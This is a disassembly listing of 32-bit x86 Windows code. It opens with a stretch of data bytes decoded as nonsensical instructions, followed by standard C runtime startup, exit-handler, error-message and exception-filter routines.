  424180:	add    dl,BYTE PTR cs:[ebx-0x791906b9]
  424187:	mov    ah,0xd2
  424189:	push   edi
  42418a:	inc    esp
  42418b:	jnp    0x42412e
  42418d:	addr16 jb 0x42418b
  424190:	sub    ebx,DWORD PTR [ebx-0x53079cda]
  424196:	rcr    BYTE PTR [edi],0xc6
  424199:	cmp    edi,esi
  42419b:	and    BYTE PTR [ebx+0x25c8935c],cl
  4241a1:	push   ebp
  4241a2:	test   al,bh
  4241a4:	dec    ecx
  4241a5:	std    
  4241a6:	mov    ebp,0xf041b3a
  4241ab:	lea    eax,[esi+0x1044834a]
  4241b1:	xor    BYTE PTR ds:0x23ef1c8e,ah
  4241b7:	rcr    cl,0x21
  4241ba:	and    eax,DWORD PTR [esi-0x71]
  4241bd:	ret    0x8365
  4241c0:	sahf   
  4241c1:	push   esp
  4241c2:	cmp    ah,BYTE PTR [ecx+0x71]
  4241c5:	shl    dh,1
  4241c7:	mov    bh,0x2b
  4241c9:	out    0xae,al
  4241cb:	sbb    al,BYTE PTR [ecx+ebx*4+0x33]
  4241cf:	xchg   edx,eax
  4241d0:	lds    esi,FWORD PTR [edi+eax*1-0x3d]
  4241d4:	push   0xffffffa2
  4241d6:	loop   0x4241c8
  4241d8:	ds adc dl,dl
  4241db:	out    dx,al
  4241dc:	adc    esi,ebp
  4241de:	add    al,BYTE PTR es:[eax]
  4241e1:	retf   0xc59e
  4241e4:	ins    DWORD PTR es:[edi],dx
  4241e5:	jmp    0x5abe:0xc46e21fd
  4241ec:	shr    al,cl
  4241ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241ef:	inc    edi
  4241f0:	fadd   st(5),st
  4241f2:	into   
  4241f3:	pop    ecx
  4241f4:	jno    0x4241ca
  4241f6:	mov    eax,ds:0xfea0f22a
  4241fb:	icebp  
  4241fc:	pop    esi
  4241fd:	das    
  4241fe:	cdq    
  4241ff:	arpl   WORD PTR [edx-0x6d],bp
  424202:	out    dx,eax
  424203:	aad    0xfe
  424205:	mov    ds:0xd0db1244,eax
  42420a:	les    esi,FWORD PTR [eax+eax*4]
  42420d:	jge    0x4241d2
  42420f:	dec    DWORD PTR [esi*4-0x7f157b66]
  424216:	inc    edx
  424217:	mov    al,ds:0x3c98ca46
  42421c:	lods   al,BYTE PTR ds:[esi]
  42421d:	mov    esi,0x9f8a5b12
  424222:	xlat   BYTE PTR ds:[ebx]
  424223:	jp     0x42427b
  424225:	dec    edi
  424226:	adc    ebp,0x49866601
  42422c:	pop    edi
  42422d:	lds    ebp,FWORD PTR [edi-0x36]
  424230:	sbb    esp,DWORD PTR [ebp+0x44]
  424233:	push   ss
  424234:	sbb    bh,ch
  424236:	push   ebp
  424237:	xchg   ebp,eax
  424238:	arpl   WORD PTR [esi],cx
  42423a:	jae    0x4241be
  42423c:	dec    esi
  42423d:	scas   eax,DWORD PTR es:[edi]
  42423e:	imul   ecx,DWORD PTR [eax],0x56cebaa0
  424244:	ins    DWORD PTR es:[edi],dx
  424245:	push   cs
  424246:	icebp  
  424247:	int    0xc9
  424249:	test   bh,0xc8
  42424c:	outs   dx,DWORD PTR ds:[esi]
  42424d:	or     esi,DWORD PTR [edi+eax*4-0x5878f3df]
  424254:	sbb    eax,0x8b896e51
  424259:	inc    eax
  42425a:	fstp   QWORD PTR [ecx-0x5b792a97]
  424260:	ins    BYTE PTR es:[edi],dx
  424261:	jge    0x424275
  424263:	mov    edx,DWORD PTR [ecx]
  424265:	xchg   DWORD PTR [edi-0x1802c26],ebp
  42426b:	jb     0x424211
  42426d:	dec    ebx
  42426e:	loop   0x42422d
  424270:	or     edi,DWORD PTR [ecx+0x77]
  424273:	mov    ah,0x57
  424275:	arpl   WORD PTR [esi+0x4c],bx
  424278:	daa    
  424279:	in     eax,0x64
  42427b:	pop    ds
  42427c:	xchg   ecx,eax
  42427d:	sar    esp,1
  42427f:	adc    dh,BYTE PTR ds:0x32a21916
  424285:	test   BYTE PTR [ecx+edx*1+0x5d],ch
  424289:	push   edi
  42428a:	call   0x3ac1:0xf8fdcfe5
  424291:	loopne 0x4242ce
  424293:	mov    al,ds:0xd1edd926
  424298:	das    
  424299:	loop   0x4242b1
  42429b:	pop    eax
  42429c:	sbb    ebx,eax
  42429e:	pop    esp
  42429f:	sbb    al,0x89
  4242a1:	mov    esp,0xaa59a1e1
  4242a6:	and    BYTE PTR [ebx+0x9b177ba],ch
  4242ac:	or     bx,sp
  4242af:	ins    DWORD PTR es:[edi],dx
  4242b0:	mov    eax,ds:0xcb947244
  4242b5:	inc    eax
  4242b6:	ret    
  4242b7:	ins    DWORD PTR es:[edi],dx
  4242b8:	xlat   BYTE PTR ds:[ebx]
  4242b9:	dec    ebx
  4242ba:	repnz dec esi
  4242bc:	js     0x4242f9
  4242be:	sub    ebp,ebx
  4242c0:	ins    BYTE PTR es:[edi],dx
  4242c1:	cmp    edi,DWORD PTR [edi+0x24d60b24]
  4242c7:	mov    esi,0x6ba83d34
  4242cc:	fsubr  QWORD PTR [ecx+eax*1+0x46b443ca]
  4242d3:	int3   
  4242d4:	dec    esp
  4242d5:	imul   ecx,DWORD PTR [edx+0x73],0x3be1d95c
  4242dc:	nop
  4242dd:	das    
  4242de:	test   al,0x3c
  4242e0:	mov    ch,0x66
  4242e2:	dec    ebp
  4242e3:	test   BYTE PTR [edx-0x633c2a89],ah
  4242e9:	cmp    al,0xb0
  4242eb:	pop    es
  4242ec:	pop    ecx
  4242ed:	sub    al,0x34
  4242ef:	sahf   
  4242f0:	inc    esi
  4242f1:	stc    
  4242f2:	test   al,0x1
  4242f4:	sub    BYTE PTR [eax],ah
  4242f6:	mov    eax,0xa43217cc
  4242fb:	dec    DWORD PTR [ecx+0x195c2d29]
  424301:	or     bl,BYTE PTR [edx]
  424303:	not    BYTE PTR ds:0x1ac848c8
  424309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42430a:	cwde   
  42430b:	jo     0x424357
  42430d:	pushf  
  42430e:	jecxz  0x4242ba
  424310:	mov    dh,cl
  424312:	sub    DWORD PTR gs:[ebx+0x6e723dd3],ecx
  424319:	cmp    eax,0x7d71b267
  42431e:	push   0x2
  424320:	push   0xa0
  424325:	push   0x0
  424327:	call   DWORD PTR ds:0x429030
  42432d:	push   0x0
  42432f:	push   0x0
  424331:	call   DWORD PTR ds:0x429138
  424337:	xor    eax,eax
  424339:	add    esp,0x10
  42433c:	ret    0x10
  42433f:	nop
  424340:	jmp    DWORD PTR ds:0x429124
  424346:	jmp    DWORD PTR ds:0x429128
  42434c:	jmp    DWORD PTR ds:0x42911c
  424352:	jmp    DWORD PTR ds:0x429118
  424358:	cmp    DWORD PTR ds:0x46707c,0x1
  42435f:	jne    0x424366
  424361:	call   0x4248a4
  424366:	push   DWORD PTR [esp+0x4]
  42436a:	call   0x42472d
  42436f:	push   0xff
  424374:	call   DWORD PTR ds:0x466774
  42437a:	pop    ecx
  42437b:	pop    ecx
  42437c:	ret    
  42437d:	cmp    DWORD PTR ds:0x46707c,0x1
  424384:	jne    0x42438b
  424386:	call   0x4248a4
  42438b:	push   DWORD PTR [esp+0x4]
  42438f:	call   0x42472d
  424394:	push   0xff
  424399:	call   0x424573
  42439e:	pop    ecx
  42439f:	pop    ecx
  4243a0:	ret    
  4243a1:	push   0x60
  4243a3:	push   0x429170
  4243a8:	call   0x425290
  4243ad:	mov    edi,0x94
  4243b2:	mov    eax,edi
  4243b4:	call   0x4252e0
  4243b9:	mov    DWORD PTR [ebp-0x18],esp
  4243bc:	mov    esi,esp
  4243be:	mov    DWORD PTR [esi],edi
  4243c0:	push   esi
  4243c1:	call   DWORD PTR ds:0x42906c
  4243c7:	mov    ecx,DWORD PTR [esi+0x10]
  4243ca:	mov    DWORD PTR ds:0x467084,ecx
  4243d0:	mov    eax,DWORD PTR [esi+0x4]
  4243d3:	mov    ds:0x467090,eax
  4243d8:	mov    edx,DWORD PTR [esi+0x8]
  4243db:	mov    DWORD PTR ds:0x467094,edx
  4243e1:	mov    esi,DWORD PTR [esi+0xc]
  4243e4:	and    esi,0x7fff
  4243ea:	mov    DWORD PTR ds:0x467088,esi
  4243f0:	cmp    ecx,0x2
  4243f3:	je     0x424401
  4243f5:	or     esi,0x8000
  4243fb:	mov    DWORD PTR ds:0x467088,esi
  424401:	shl    eax,0x8
  424404:	add    eax,edx
  424406:	mov    ds:0x46708c,eax
  42440b:	xor    esi,esi
  42440d:	push   esi
  42440e:	mov    edi,DWORD PTR ds:0x429044
  424414:	call   edi
  424416:	cmp    WORD PTR [eax],0x5a4d
  42441b:	jne    0x42443c
  42441d:	mov    ecx,DWORD PTR [eax+0x3c]
  424420:	add    ecx,eax
  424422:	cmp    DWORD PTR [ecx],0x4550
  424428:	jne    0x42443c
  42442a:	movzx  eax,WORD PTR [ecx+0x18]
  42442e:	cmp    eax,0x10b
  424433:	je     0x424454
  424435:	cmp    eax,0x20b
  42443a:	je     0x424441
  42443c:	mov    DWORD PTR [ebp-0x1c],esi
  42443f:	jmp    0x424468
  424441:	cmp    DWORD PTR [ecx+0x84],0xe
  424448:	jbe    0x42443c
  42444a:	xor    eax,eax
  42444c:	cmp    DWORD PTR [ecx+0xf8],esi
  424452:	jmp    0x424462
  424454:	cmp    DWORD PTR [ecx+0x74],0xe
  424458:	jbe    0x42443c
  42445a:	xor    eax,eax
  42445c:	cmp    DWORD PTR [ecx+0xe8],esi
  424462:	setne  al
  424465:	mov    DWORD PTR [ebp-0x1c],eax
  424468:	push   0x1
  42446a:	call   0x42523f
  42446f:	pop    ecx
  424470:	test   eax,eax
  424472:	jne    0x42447c
  424474:	push   0x1c
  424476:	call   0x42437d
  42447b:	pop    ecx
  42447c:	call   0x4251b6
  424481:	test   eax,eax
  424483:	jne    0x42448d
  424485:	push   0x10
  424487:	call   0x42437d
  42448c:	pop    ecx
  42448d:	call   0x42509f
  424492:	mov    DWORD PTR [ebp-0x4],esi
  424495:	call   0x424ea1
  42449a:	test   eax,eax
  42449c:	jge    0x4244a6
  42449e:	push   0x1b
  4244a0:	call   0x424358
  4244a5:	pop    ecx
  4244a6:	call   DWORD PTR ds:0x429068
  4244ac:	mov    ds:0x467834,eax
  4244b1:	call   0x424d7f
  4244b6:	mov    ds:0x467074,eax
  4244bb:	call   0x424cdd
  4244c0:	test   eax,eax
  4244c2:	jge    0x4244cc
  4244c4:	push   0x8
  4244c6:	call   0x424358
  4244cb:	pop    ecx
  4244cc:	call   0x424aaa
  4244d1:	test   eax,eax
  4244d3:	jge    0x4244dd
  4244d5:	push   0x9
  4244d7:	call   0x424358
  4244dc:	pop    ecx
  4244dd:	call   0x4245b5
  4244e2:	mov    DWORD PTR [ebp-0x20],eax
  4244e5:	cmp    eax,esi
  4244e7:	je     0x4244f0
  4244e9:	push   eax
  4244ea:	call   0x424358
  4244ef:	pop    ecx
  4244f0:	mov    DWORD PTR [ebp-0x38],esi
  4244f3:	lea    eax,[ebp-0x64]
  4244f6:	push   eax
  4244f7:	call   DWORD PTR ds:0x429064
  4244fd:	call   0x424a41
  424502:	mov    DWORD PTR [ebp-0x68],eax
  424505:	test   BYTE PTR [ebp-0x38],0x1
  424509:	je     0x424511
  42450b:	movzx  eax,WORD PTR [ebp-0x34]
  42450f:	jmp    0x424514
  424511:	push   0xa
  424513:	pop    eax
  424514:	push   eax
  424515:	push   DWORD PTR [ebp-0x68]
  424518:	push   esi
  424519:	push   esi
  42451a:	call   edi
  42451c:	push   eax
  42451d:	call   0x422e90
  424522:	mov    edi,eax
  424524:	mov    DWORD PTR [ebp-0x6c],edi
  424527:	cmp    DWORD PTR [ebp-0x1c],esi
  42452a:	jne    0x424532
  42452c:	push   edi
  42452d:	call   0x4246ed
  424532:	call   0x42470f
  424537:	jmp    0x424564
  424539:	mov    eax,DWORD PTR [ebp-0x14]
  42453c:	mov    ecx,DWORD PTR [eax]
  42453e:	mov    ecx,DWORD PTR [ecx]
  424540:	mov    DWORD PTR [ebp-0x70],ecx
  424543:	push   eax
  424544:	push   ecx
  424545:	call   0x4248dd
  42454a:	pop    ecx
  42454b:	pop    ecx
  42454c:	ret    
  42454d:	mov    esp,DWORD PTR [ebp-0x18]
  424550:	mov    edi,DWORD PTR [ebp-0x70]
  424553:	cmp    DWORD PTR [ebp-0x1c],0x0
  424557:	jne    0x42455f
  424559:	push   edi
  42455a:	call   0x4246fe
  42455f:	call   0x42471e
  424564:	or     DWORD PTR [ebp-0x4],0xffffffff
  424568:	mov    eax,edi
  42456a:	lea    esp,[ebp-0x7c]
  42456d:	call   0x4252cb
  424572:	ret    
  424573:	push   0x42918c
  424578:	call   DWORD PTR ds:0x429044
  42457e:	test   eax,eax
  424580:	je     0x424598
  424582:	push   0x42917c
  424587:	push   eax
  424588:	call   DWORD PTR ds:0x429048
  42458e:	test   eax,eax
  424590:	je     0x424598
  424592:	push   DWORD PTR [esp+0x4]
  424596:	call   eax
  424598:	push   DWORD PTR [esp+0x4]
  42459c:	call   DWORD PTR ds:0x429070
  4245a2:	int3   
  4245a3:	push   0x8
  4245a5:	call   0x42544f
  4245aa:	pop    ecx
  4245ab:	ret    
  4245ac:	push   0x8
  4245ae:	call   0x4253bb
  4245b3:	pop    ecx
  4245b4:	ret    
  4245b5:	mov    eax,ds:0x467830
  4245ba:	test   eax,eax
  4245bc:	je     0x4245c0
  4245be:	call   eax
  4245c0:	push   esi
  4245c1:	push   edi
  4245c2:	mov    ecx,0x42b00c
  4245c7:	mov    edi,0x42b018
  4245cc:	xor    eax,eax
  4245ce:	cmp    ecx,edi
  4245d0:	mov    esi,ecx
  4245d2:	jae    0x4245eb
  4245d4:	test   eax,eax
  4245d6:	jne    0x424617
  4245d8:	mov    ecx,DWORD PTR [esi]
  4245da:	test   ecx,ecx
  4245dc:	je     0x4245e0
  4245de:	call   ecx
  4245e0:	add    esi,0x4
  4245e3:	cmp    esi,edi
  4245e5:	jb     0x4245d4
  4245e7:	test   eax,eax
  4245e9:	jne    0x424617
  4245eb:	push   0x4250e3
  4245f0:	call   0x425560
  4245f5:	mov    esi,0x42b000
  4245fa:	mov    eax,esi
  4245fc:	mov    edi,0x42b008
  424601:	cmp    eax,edi
  424603:	pop    ecx
  424604:	jae    0x424615
  424606:	mov    eax,DWORD PTR [esi]
  424608:	test   eax,eax
  42460a:	je     0x42460e
  42460c:	call   eax
  42460e:	add    esi,0x4
  424611:	cmp    esi,edi
  424613:	jb     0x424606
  424615:	xor    eax,eax
  424617:	pop    edi
  424618:	pop    esi
  424619:	ret    
  42461a:	push   ebp
  42461b:	mov    ebp,esp
  42461d:	push   esi
  42461e:	push   edi
  42461f:	push   0x8
  424621:	call   0x42544f
  424626:	xor    esi,esi
  424628:	inc    esi
  424629:	cmp    DWORD PTR ds:0x4670c4,esi
  42462f:	pop    ecx
  424630:	jne    0x424642
  424632:	push   DWORD PTR [ebp+0x8]
  424635:	call   DWORD PTR ds:0x429078
  42463b:	push   eax
  42463c:	call   DWORD PTR ds:0x429074
  424642:	cmp    DWORD PTR [ebp+0xc],0x0
  424646:	mov    al,BYTE PTR [ebp+0x10]
  424649:	mov    DWORD PTR ds:0x4670c0,esi
  42464f:	mov    ds:0x4670bc,al
  424654:	jne    0x4246a8
  424656:	mov    ecx,DWORD PTR ds:0x467828
  42465c:	test   ecx,ecx
  42465e:	je     0x424689
  424660:	mov    eax,ds:0x467824
  424665:	sub    eax,0x4
  424668:	cmp    eax,ecx
  42466a:	jmp    0x424682
  42466c:	mov    eax,DWORD PTR [eax]
  42466e:	test   eax,eax
  424670:	je     0x424674
  424672:	call   eax
  424674:	mov    eax,ds:0x467824
  424679:	sub    eax,0x4
  42467c:	cmp    eax,DWORD PTR ds:0x467828
  424682:	mov    ds:0x467824,eax
  424687:	jae    0x42466c
  424689:	mov    eax,0x42b01c
  42468e:	mov    esi,0x42b020
  424693:	cmp    eax,esi
  424695:	mov    edi,eax
  424697:	jae    0x4246a8
  424699:	mov    eax,DWORD PTR [edi]
  42469b:	test   eax,eax
  42469d:	je     0x4246a1
  42469f:	call   eax
  4246a1:	add    edi,0x4
  4246a4:	cmp    edi,esi
  4246a6:	jb     0x424699
  4246a8:	mov    eax,0x42b024
  4246ad:	mov    esi,0x42b028
  4246b2:	cmp    eax,esi
  4246b4:	mov    edi,eax
  4246b6:	jae    0x4246c7
  4246b8:	mov    eax,DWORD PTR [edi]
  4246ba:	test   eax,eax
  4246bc:	je     0x4246c0
  4246be:	call   eax
  4246c0:	add    edi,0x4
  4246c3:	cmp    edi,esi
  4246c5:	jb     0x4246b8
  4246c7:	cmp    DWORD PTR [ebp+0x10],0x0
  4246cb:	pop    edi
  4246cc:	pop    esi
  4246cd:	je     0x4246d8
  4246cf:	push   0x8
  4246d1:	call   0x4253bb
  4246d6:	jmp    0x4246ea
  4246d8:	push   DWORD PTR [ebp+0x8]
  4246db:	mov    DWORD PTR ds:0x4670c4,0x1
  4246e5:	call   0x424573
  4246ea:	pop    ecx
  4246eb:	pop    ebp
  4246ec:	ret    
  4246ed:	push   0x0
  4246ef:	push   0x0
  4246f1:	push   DWORD PTR [esp+0xc]
  4246f5:	call   0x42461a
  4246fa:	add    esp,0xc
  4246fd:	ret    
  4246fe:	push   0x0
  424700:	push   0x1
  424702:	push   DWORD PTR [esp+0xc]
  424706:	call   0x42461a
  42470b:	add    esp,0xc
  42470e:	ret    
  42470f:	push   0x1
  424711:	push   0x0
  424713:	push   0x0
  424715:	call   0x42461a
  42471a:	add    esp,0xc
  42471d:	ret    
  42471e:	push   0x1
  424720:	push   0x1
  424722:	push   0x0
  424724:	call   0x42461a
  424729:	add    esp,0xc
  42472c:	ret    
  42472d:	push   ebp
  42472e:	mov    ebp,esp
  424730:	sub    esp,0x10c
  424736:	mov    eax,ds:0x4669f0
  42473b:	xor    eax,DWORD PTR [ebp+0x4]
  42473e:	mov    ecx,DWORD PTR [ebp+0x8]
  424741:	push   ebx
  424742:	push   esi
  424743:	mov    DWORD PTR [ebp-0x4],eax
  424746:	xor    edx,edx
  424748:	push   edi
  424749:	xor    eax,eax
  42474b:	cmp    ecx,DWORD PTR [eax*8+0x466780]
  424752:	je     0x42475a
  424754:	inc    eax
  424755:	cmp    eax,0x12
  424758:	jb     0x42474b
  42475a:	mov    esi,eax
  42475c:	shl    esi,0x3
  42475f:	cmp    ecx,DWORD PTR [esi+0x466780]
  424765:	jne    0x42488e
  42476b:	mov    eax,ds:0x46707c
  424770:	cmp    eax,0x1
  424773:	je     0x424869
  424779:	cmp    eax,edx
  42477b:	jne    0x42478a
  42477d:	cmp    DWORD PTR ds:0x466778,0x1
  424784:	je     0x424869
  42478a:	cmp    ecx,0xfc
  424790:	je     0x42488e
  424796:	push   0x104
  42479b:	lea    eax,[ebp-0x10c]
  4247a1:	push   eax
  4247a2:	push   edx
  4247a3:	mov    BYTE PTR [ebp-0x8],dl
  4247a6:	call   DWORD PTR ds:0x429084
  4247ac:	test   eax,eax
  4247ae:	jne    0x4247c3
  4247b0:	lea    eax,[ebp-0x10c]
  4247b6:	push   0x4294e4
  4247bb:	push   eax
  4247bc:	call   0x425670
  4247c1:	pop    ecx
  4247c2:	pop    ecx
  4247c3:	lea    eax,[ebp-0x10c]
  4247c9:	push   eax
  4247ca:	lea    edi,[ebp-0x10c]
  4247d0:	call   0x4258a0
  4247d5:	inc    eax
  4247d6:	cmp    eax,0x3c
  4247d9:	pop    ecx
  4247da:	jbe    0x424805
  4247dc:	lea    eax,[ebp-0x10c]
  4247e2:	push   eax
  4247e3:	call   0x4258a0
  4247e8:	mov    edi,eax
  4247ea:	lea    eax,[ebp-0x10c]
  4247f0:	sub    eax,0x3b
  4247f3:	push   0x3
  4247f5:	add    edi,eax
  4247f7:	push   0x4294e0
  4247fc:	push   edi
  4247fd:	call   0x425770
  424802:	add    esp,0x10
  424805:	push   edi
  424806:	call   0x4258a0
  42480b:	push   DWORD PTR [esi+0x466784]
  424811:	mov    ebx,eax
  424813:	call   0x4258a0
  424818:	lea    eax,[ebx+eax*1+0x1c]
  42481c:	pop    ecx
  42481d:	add    eax,0x3
  424820:	pop    ecx
  424821:	and    eax,0xfffffffc
  424824:	call   0x4252e0
  424829:	mov    ebx,esp
  42482b:	push   0x4294c4
  424830:	push   ebx
  424831:	call   0x425670
  424836:	push   edi
  424837:	push   ebx
  424838:	call   0x425680
  42483d:	push   0x4294c0
  424842:	push   ebx
  424843:	call   0x425680
  424848:	push   DWORD PTR [esi+0x466784]
  42484e:	push   ebx
  42484f:	call   0x425680
  424854:	push   0x12010
  424859:	push   0x429498
  42485e:	push   ebx
  42485f:	call   0x425572
  424864:	add    esp,0x2c
  424867:	jmp    0x42488e
  424869:	push   edx
  42486a:	lea    eax,[ebp+0x8]
  42486d:	push   eax
  42486e:	lea    esi,[esi+0x466784]
  424874:	push   DWORD PTR [esi]
  424876:	call   0x4258a0
  42487b:	pop    ecx
  42487c:	push   eax
  42487d:	push   DWORD PTR [esi]
  42487f:	push   0xfffffff4
  424881:	call   DWORD PTR ds:0x429080
  424887:	push   eax
  424888:	call   DWORD PTR ds:0x42907c
  42488e:	lea    esp,[ebp-0x118]
  424894:	mov    ecx,DWORD PTR [ebp-0x4]
  424897:	xor    ecx,DWORD PTR [ebp+0x4]
  42489a:	call   0x42595c
  42489f:	pop    edi
  4248a0:	pop    esi
  4248a1:	pop    ebx
  4248a2:	leave  
  4248a3:	ret    
  4248a4:	mov    eax,ds:0x46707c
  4248a9:	cmp    eax,0x1
  4248ac:	je     0x4248bb
  4248ae:	test   eax,eax
  4248b0:	jne    0x4248dc
  4248b2:	cmp    DWORD PTR ds:0x466778,0x1
  4248b9:	jne    0x4248dc
  4248bb:	push   0xfc
  4248c0:	call   0x42472d
  4248c5:	mov    eax,ds:0x4670c8
  4248ca:	test   eax,eax
  4248cc:	pop    ecx
  4248cd:	je     0x4248d1
  4248cf:	call   eax
  4248d1:	push   0xff
  4248d6:	call   0x42472d
  4248db:	pop    ecx
  4248dc:	ret    
  4248dd:	push   ebp
  4248de:	mov    ebp,esp
  4248e0:	push   ecx
  4248e1:	push   ebx
  4248e2:	push   esi
  4248e3:	push   edi
  4248e4:	call   0x425145
  4248e9:	mov    edi,DWORD PTR [ebp+0x8]
  4248ec:	mov    esi,eax
  4248ee:	mov    edx,DWORD PTR [esi+0x54]
  4248f1:	mov    eax,ds:0x466894
  4248f6:	mov    ecx,edx
  4248f8:	cmp    DWORD PTR [ecx],edi
  4248fa:	je     0x424909
  4248fc:	lea    ebx,[eax+eax*2]
  4248ff:	add    ecx,0xc
  424902:	lea    ebx,[edx+ebx*4]
  424905:	cmp    ecx,ebx
  424907:	jb     0x4248f8
  424909:	lea    eax,[eax+eax*2]
  42490c:	lea    eax,[edx+eax*4]
  42490f:	cmp    ecx,eax
  424911:	jae    0x424917
  424913:	cmp    DWORD PTR [ecx],edi
  424915:	je     0x424919
  424917:	xor    ecx,ecx
  424919:	test   ecx,ecx
  42491b:	je     0x424a33
  424921:	mov    ebx,DWORD PTR [ecx+0x8]
  424924:	test   ebx,ebx
  424926:	mov    DWORD PTR [ebp+0x8],ebx
  424929:	je     0x424a33
  42492f:	cmp    ebx,0x5
  424932:	jne    0x424940
  424934:	and    DWORD PTR [ecx+0x8],0x0
  424938:	xor    eax,eax
  42493a:	inc    eax
  42493b:	jmp    0x424a3c
  424940:	cmp    ebx,0x1
  424943:	je     0x424a2e
  424949:	mov    eax,DWORD PTR [esi+0x58]
  42494c:	mov    DWORD PTR [ebp-0x4],eax
  42494f:	mov    eax,DWORD PTR [ebp+0xc]
  424952:	mov    DWORD PTR [esi+0x58],eax
  424955:	mov    eax,DWORD PTR [ecx+0x4]
  424958:	cmp    eax,0x8
  42495b:	jne    0x424a20
  424961:	mov    edx,DWORD PTR ds:0x466888
  424967:	mov    eax,ds:0x46688c
  42496c:	add    eax,edx
  42496e:	cmp    edx,eax
  424970:	jge    0x424999
  424972:	lea    eax,[edx+edx*2]
  424975:	shl    eax,0x2
  424978:	mov    edi,DWORD PTR [esi+0x54]
  42497b:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424980:	mov    edi,DWORD PTR ds:0x466888
  424986:	mov    ebx,DWORD PTR ds:0x46688c
  42498c:	inc    edx
  42498d:	add    ebx,edi
  42498f:	add    eax,0xc
  424992:	cmp    edx,ebx
  424994:	jl     0x424978
  424996:	mov    ebx,DWORD PTR [ebp+0x8]
  424999:	mov    ecx,DWORD PTR [ecx]
  42499b:	cmp    ecx,0xc000008e
  4249a1:	mov    edi,DWORD PTR [esi+0x5c]
  4249a4:	jne    0x4249af
  4249a6:	mov    DWORD PTR [esi+0x5c],0x83
  4249ad:	jmp    0x424a13
  4249af:	cmp    ecx,0xc0000090
  4249b5:	jne    0x4249c0
  4249b7:	mov    DWORD PTR [esi+0x5c],0x81
  4249be:	jmp    0x424a13
  4249c0:	cmp    ecx,0xc0000091
  4249c6:	jne    0x4249d1
  4249c8:	mov    DWORD PTR [esi+0x5c],0x84
  4249cf:	jmp    0x424a13
  4249d1:	cmp    ecx,0xc0000093
  4249d7:	jne    0x4249e2
  4249d9:	mov    DWORD PTR [esi+0x5c],0x85
  4249e0:	jmp    0x424a13
  4249e2:	cmp    ecx,0xc000008d
  4249e8:	jne    0x4249f3
  4249ea:	mov    DWORD PTR [esi+0x5c],0x82
  4249f1:	jmp    0x424a13
  4249f3:	cmp    ecx,0xc000008f
  4249f9:	jne    0x424a04
  4249fb:	mov    DWORD PTR [esi+0x5c],0x86
  424a02:	jmp    0x424a13
  424a04:	cmp    ecx,0xc0000092
  424a0a:	jne    0x424a13
  424a0c:	mov    DWORD PTR [esi+0x5c],0x8a
  424a13:	push   DWORD PTR [esi+0x5c]
  424a16:	push   0x8
  424a18:	call   ebx
  424a1a:	pop    ecx
  424a1b:	mov    DWORD PTR [esi+0x5c],edi
  424a1e:	jmp    0x424a27
  424a20:	and    DWORD PTR [ecx+0x8],0x0
  424a24:	push   eax
  424a25:	call   ebx
  424a27:	mov    eax,DWORD PTR [ebp-0x4]
  424a2a:	pop    ecx
  424a2b:	mov    DWORD PTR [esi+0x58],eax
  424a2e:	or     eax,0xffffffff
  424a31:	jmp    0x424a3c
  424a33:	push   DWORD PTR [ebp+0xc]
  424a36:	call   DWORD PTR ds:0x429088
  424a3c:	pop    edi
  424a3d:	pop    esi
  424a3e:	pop    ebx
  424a3f:	leave  
  424a40:	ret    
  424a41:	cmp    DWORD PTR ds:0x46782c,0x0
  424a48:	jne    0x424a4f
  424a4a:	call   0x425e7c
  424a4f:	push   esi
  424a50:	mov    esi,DWORD PTR ds:0x467834
  424a56:	test   esi,esi
  424a58:	jne    0x424a61
  424a5a:	mov    esi,0x4294fb
  424a5f:	jmp    0x424aa6
  424a61:	mov    al,BYTE PTR [esi]
  424a63:	cmp    al,0x22
  424a65:	jne    0x424a8f
  424a67:	inc    esi
  424a68:	mov    al,BYTE PTR [esi]
  424a6a:	cmp    al,0x22
  424a6c:	je     0x424a9f
  424a6e:	test   al,al
  424a70:	je     0x424a88
  424a72:	movzx  eax,al
  424a75:	push   eax
  424a76:	call   0x42599b
  424a7b:	test   eax,eax
  424a7d:	pop    ecx
  424a7e:	je     0x424a81
  424a80:	inc    esi
  424a81:	inc    esi
  424a82:	mov    al,BYTE PTR [esi]
  424a84:	cmp    al,0x22
  424a86:	jne    0x424a6e
  424a88:	cmp    BYTE PTR [esi],0x22
  424a8b:	jne    0x424aa0
  424a8d:	jmp    0x424a9f
  424a8f:	cmp    al,0x20
  424a91:	jbe    0x424aa0
  424a93:	inc    esi
  424a94:	cmp    BYTE PTR [esi],0x20
  424a97:	ja     0x424a93
  424a99:	jmp    0x424aa0
  424a9b:	cmp    al,0x20
  424a9d:	ja     0x424aa6
  424a9f:	inc    esi
  424aa0:	mov    al,BYTE PTR [esi]
  424aa2:	test   al,al
  424aa4:	jne    0x424a9b
  424aa6:	mov    eax,esi
  424aa8:	pop    esi
  424aa9:	ret    
  424aaa:	push   ebx
  424aab:	xor    ebx,ebx
  424aad:	cmp    DWORD PTR ds:0x46782c,ebx
  424ab3:	push   esi
  424ab4:	push   edi
  424ab5:	jne    0x424abc
  424ab7:	call   0x425e7c
  424abc:	mov    esi,DWORD PTR ds:0x467074
  424ac2:	xor    edi,edi
  424ac4:	cmp    esi,ebx
  424ac6:	jne    0x424ada
  424ac8:	jmp    0x424afa
  424aca:	cmp    al,0x3d
  424acc:	je     0x424acf
  424ace:	inc    edi
  424acf:	push   esi
  424ad0:	call   0x4258a0
  424ad5:	pop    ecx
  424ad6:	lea    esi,[esi+eax*1+0x1]
  424ada:	mov    al,BYTE PTR [esi]
  424adc:	cmp    al,bl
  424ade:	jne    0x424aca
  424ae0:	lea    eax,[edi*4+0x4]
  424ae7:	push   eax
  424ae8:	call   0x425fb2
  424aed:	mov    edi,eax
  424aef:	cmp    edi,ebx
  424af1:	pop    ecx
  424af2:	mov    DWORD PTR ds:0x4670a4,edi
  424af8:	jne    0x424aff
  424afa:	or     eax,0xffffffff
  424afd:	jmp    0x424b57
  424aff:	mov    esi,DWORD PTR ds:0x467074
  424b05:	push   ebp
  424b06:	jmp    0x424b32
  424b08:	push   esi
  424b09:	call   0x4258a0
  424b0e:	mov    ebp,eax
  424b10:	inc    ebp
  424b11:	cmp    BYTE PTR [esi],0x3d
  424b14:	pop    ecx
  424b15:	je     0x424b30
  424b17:	push   ebp
  424b18:	call   0x425fb2
  424b1d:	cmp    eax,ebx
  424b1f:	pop    ecx
  424b20:	mov    DWORD PTR [edi],eax
  424b22:	je     0x424b5b
  424b24:	push   esi
  424b25:	push   eax
  424b26:	call   0x425670
  424b2b:	pop    ecx
  424b2c:	pop    ecx
  424b2d:	add    edi,0x4
